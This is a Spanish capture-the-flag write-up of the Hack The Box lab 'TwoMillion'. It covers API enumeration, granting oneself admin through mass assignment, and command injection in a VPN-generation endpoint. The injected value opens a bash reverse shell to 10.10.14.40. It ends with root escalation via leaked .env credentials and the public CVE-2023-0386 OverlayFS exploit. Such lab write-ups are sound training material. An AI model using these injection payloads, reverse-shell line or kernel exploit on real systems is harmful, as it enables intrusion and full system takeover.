# TwoMillion

Tags: [[_api]],[[_commandInjection]],[[_webExploitation]],[[_infoLeakage]],[[_cve]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Ubuntu Jammy</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

<span style="color:#ff669c">22</span> - SSH. <span style="color:#379075">Version 8.9p1</span>
<span style="color:#ff669c">80</span> - HTTP. <span style="color:#379075">Nginx</span>


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> de momento.

<span style="color:#ff669c">80</span>.
<span style="color:#ff2dc0">whatweb</span>. Me <span style="color:#ff2dc0">redirige</span> a <span style="color:#ecacb6">2million.htb</span>, lo metemos en el <span style="color:#ecacb6">/etc/hosts</span>
Tenemos un <span style="color:#ff2dc0">correo</span>
<span style="color:#ecacb6">info@hackthebox.eu</span>

<span style="color:#ff2dc0">Desde la web</span>.
Vemos que es la <span style="color:#ff2dc0">antigua plataforma </span>de <span style="color:#ff2dc0">HTB</span>, para <span style="color:#ff2dc0">loguearnos</span> tenemos que "<span style="color:#ff2dc0">Hackear</span>" la <span style="color:#ff2dc0">web</span>.

<span style="color:#ff2dc0">Rutas</span>.
<span style="color:#ecacb6">/login</span>
<span style="color:#ecacb6">/invite</span> :    en el <span style="color:#ff2dc0">código fuente</span> veo que <span style="color:#07b4f2">si</span> tengo un <span style="color:#ff2dc0">código</span> de <span style="color:#ff2dc0">invitación válido</span>, me <span style="color:#07b4f2">lleva</span> a <span style="color:#ecacb6">/register</span>, ahí <span style="color:#07b4f2">lo puedo poner</span>.

En <span style="color:#ecacb6">/invite</span> veo en las <span style="color:#ff2dc0">herramientas</span> del <span style="color:#ff2dc0">navegador</span>, en <span style="color:#ff2dc0">console</span>, al hacer "<span style="color:#ecacb6">this</span>" veo las <span style="color:#ff2dc0">funciones</span> que están cargadas, entre ellas <span style="color:#ff2dc0">makeInviteCode()</span>, la <span style="color:#ff2dc0">ejecuto</span> y me <span style="color:#07b4f2">da</span> una <span style="color:#ff2dc0">data</span> en <span style="color:#ff2dc0">ROT13</span>, lo <span style="color:#ff2dc0">desciframos</span>.

Al <span style="color:#07b4f2">texto le hacemos</span> un
<span style="color:#ecacb6">| tr '[A-Za-z]' '[N-ZA-Mn-za-m]'</span> :    <span style="color:#ecacb6">A</span> -> <span style="color:#ecacb6">N</span> hay <span style="color:#ecacb6">13 caracteres</span>, <span style="color:#07b4f2">de ahí a</span> la <span style="color:#ecacb6">Z</span>, <span style="color:#07b4f2">luego de</span> la <span style="color:#ecacb6">A</span> a <span style="color:#07b4f2">una antes</span> de la <span style="color:#ecacb6">N</span> <span style="color:#07b4f2">que es</span> la <span style="color:#ecacb6">M</span>, <span style="color:#07b4f2">luego lo mismo</span> en <span style="color:#07b4f2">minúsculas</span>.

El <span style="color:#ff2dc0">texto descifrado</span> <span style="color:#07b4f2">dice</span> que hagamos una <span style="color:#ff2dc0">petición</span> por <span style="color:#ff2dc0">POST</span> a <span style="color:#ecacb6">/api/v1/invite/generate</span> para generar nuestro código de invitación.
Nos da un <span style="color:#07b4f2">texto</span> en <span style="color:#ff2dc0">base64</span>, lo <span style="color:#ff2dc0">decodeamos</span> y <span style="color:#07b4f2">obtenemos</span> un código de invitación, <span style="color:#ecacb6">R6L0C-42ND8-795DL-EXFZD</span>.

Nos registramos en <span style="color:#ecacb6">/register</span> solo hay que <span style="color:#07b4f2">quitar</span> el<span style="color:#ecacb6"> read_only</span> del <span style="color:#ff2dc0">HTML</span> <span style="color:#07b4f2">de donde se pone</span> el <span style="color:#ff2dc0">invite code</span>.

Ya <span style="color:#ff2dc0">logueados</span>, podemos <span style="color:#07b4f2">pensar</span> en ver si podemos <span style="color:#07b4f2">descargar</span> una <span style="color:#ff2dc0">VPN</span> de algún <span style="color:#ff2dc0">usuario</span>, de hecho sí la descarga, pero al hacer <span style="color:#ff2dc0">Hovering</span> vemos que se <span style="color:#07b4f2">trata</span> de una <span style="color:#ff2dc0">API</span>.


<span style="color:#ff2dc0">API Enumeration</span>.
Tenemos que <span style="color:#07b4f2">usar</span> la <span style="color:#ff2dc0">cookie de sesión</span>.
Hacemos
<span style="color:#88c425">curl -s -X GET "http://2million.htb/api/v1/user/vpn/generate" -b "PHPSESSID=odgvjb6ca824bjapeoapvkrtn6" -v</span>  :    vemos que <span style="color:#07b4f2">crea</span> el <span style="color:#ff2dc0">certificado</span>, y como <span style="color:#07b4f2">lo puede crear</span> con un <span style="color:#ff2dc0">comando</span> por <span style="color:#07b4f2">detrás</span>, tenemos que <span style="color:#07b4f2">encontrar</span> la <span style="color:#07b4f2">manera</span> de que<span style="color:#07b4f2"> lo haga para un usuario específico</span> (<span style="color:#379075">tratar de meter un comando</span>), porque <span style="color:#07b4f2">dice</span> que <span style="color:#07b4f2">crea</span> una <span style="color:#ff2dc0">VPN</span> <span style="color:#07b4f2">para</span> un <span style="color:#ecacb6">usuario</span>, <span style="color:#07b4f2">no solo</span> para el <span style="color:#07b4f2">mío</span>.

En <span style="color:#ecacb6">/api/v1</span> vemos <span style="color:#ff2dc0">endPoints</span> y <span style="color:#07b4f2">cosas</span> que <span style="color:#ff2dc0">admin</span> puede <span style="color:#07b4f2">hacer</span>. <span style="color:#07b4f2">Confirmamos</span> que podemos <span style="color:#07b4f2">hacer</span> una <span style="color:#ff2dc0">VPN</span> para un <span style="color:#ecacb6">usuario</span> <span style="color:#07b4f2">específico</span>.

En <span style="color:#ecacb6">/api/v1/admin/settings/update</span> podemos <span style="color:#07b4f2">actualizar</span> nuestro <span style="color:#07b4f2">perfil</span>, lo <span style="color:#ff2dc0">enumeramos</span> bien, y <span style="color:#07b4f2">nos ponemos con</span> el <span style="color:#ff2dc0">rol</span> de <span style="color:#ff2dc0">admin</span>.
<span style="color:#07b4f2">Mandamos</span> al <span style="color:#ff2dc0">endpoint</span> de <span style="color:#ecacb6">update</span>
<span style="color:#ecacb6">-H "Content-Type: application/json" -d '{"email":"joelkami@joelkami.com", "is_admin":1}'</span> :    y la <span style="color:#ff2dc0">cookie</span> <span style="color:#07b4f2">claro</span>. <span style="color:#07b4f2">Nos pone</span> como <span style="color:#ff2dc0">admin</span>.

Ya podemos <span style="color:#07b4f2">crear</span> una <span style="color:#ff2dc0">VPN</span> para un <span style="color:#ecacb6">usuario</span>, en
<span style="color:#ecacb6">/api/v1/admin/vpn/generate</span>
Ejecutamos concretamente
<span style="color:#88c425">curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -b "PHPSESSID=odgvjb6ca824bjapeoapvkrtn6" -H "Content-Type: application/json" -d '{"username":"joelkami"}'</span>  :    nos <span style="color:#07b4f2">muestra</span> la <span style="color:#ff2dc0">VPN</span> que <span style="color:#07b4f2">crea</span>, pero yo para qué la quiero, <span style="color:#07b4f2">pensando</span> que es un <span style="color:#ff2dc0">comando</span> por <span style="color:#07b4f2">detrás</span>, tratemos de <span style="color:#ff2dc0">escaparlo</span>, porque puede <span style="color:#07b4f2">tomar</span> el <span style="color:#ecacb6">usuario</span> para <span style="color:#07b4f2">crearle una</span>.

Le <span style="color:#07b4f2">enviamos</span> así la <span style="color:#ff2dc0">data</span>
<span style="color:#ecacb6">-d '{"username":"joelkami; whoami;"}'</span>  :    lo ejecuta.

Obtener <span style="color:#ff2dc0">Reverse Shell</span>
<span style="color:#ecacb6">-d '{"username":"joelkami; bash -c \"bash -i >& /dev/tcp/10.10.14.40/443 0>&1\";"}'</span>


## Escalada

Enumerar todo el sistema.
Efectivamente, Ubuntu Jammy.

<span style="color:#07b4f2">Usuarios</span> válidos a <span style="color:#ff2dc0">nivel</span> de <span style="color:#ff2dc0">sistema</span>.
<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">www-data</span>
<span style="color:#ecacb6">admin</span>

En <span style="color:#ecacb6">/var/www/html</span> vemos <span style="color:#ecacb6">.env</span>, que tiene <span style="color:#ff2dc0">credenciales</span> de acceso a <span style="color:#ff2dc0">base de datos</span>.
Las <span style="color:#07b4f2">probamos</span> con el <span style="color:#ecacb6">usuario</span> antes, y funcionan.
<span style="color:#ecacb6">admin:SuperDuperPass123</span> 

<span style="color:#07b4f2">Buscando</span> por <span style="color:#ff2dc0">archivos</span> cuyo <span style="color:#ff2dc0">propietario</span> sea <span style="color:#ecacb6">admin</span>, vemos <span style="color:#ecacb6">/var/mail/admin</span>, donde <span style="color:#07b4f2">hablan</span> de una <span style="color:#ff2dc0">vulnerabilidad</span> del <span style="color:#ff2dc0">Kernel</span>, que <span style="color:#07b4f2">aprovecha</span> el <span style="color:#ff2dc0">OverlayFS</span>, veamos este artículo https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#background-on-the-suid-bit-and-overlayfs

Si hacemos <span style="color:#88c425">uname -a</span> podemos ver que está muy <span style="color:#07b4f2">desactualizado</span>.

Usamos https://github.com/xkaneiki/CVE-2023-0386
Lo <span style="color:#ff2dc0">clonamos</span>, hacemos un <span style="color:#ff2dc0">comprimido</span> <span style="color:#07b4f2">con todo</span> para <span style="color:#ff2dc0">subirlo</span> a la <span style="color:#ff2dc0">máquina víctima</span>, esto porque <span style="color:#07b4f2">tiene</span> <span style="color:#ff2dc0">make</span> (<span style="color:#379075">sino, basta con compilarlo nosotros</span>).

Comprimir
<span style="color:#88c425">tar -czf comprimido.tar.gz CVE-2023-0386</span> 
Descomprimir
<span style="color:#88c425">tar -xzf comprimido.tar.gz</span> :    esto <span style="color:#07b4f2">en</span> la <span style="color:#ff2dc0">máquina vítcima</span>.

En el <span style="color:#ff2dc0">repositorio</span>, en la <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#88c425">make all</span>
<span style="color:#88c425">./fuse ./ovlcap/lower ./gc</span>

En <span style="color:#07b4f2">otra</span> <span style="color:#ff2dc0">terminal</span> y <span style="color:#07b4f2">en</span> el mismo <span style="color:#ff2dc0">repositorio</span>, <span style="color:#07b4f2">en</span> la <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#ecacb6">./exp</span>  :    <span style="color:#07b4f2">por aquí me vuelvo</span> <span style="color:#ff2dc0">root</span> y pa deeeentro.

FIN.
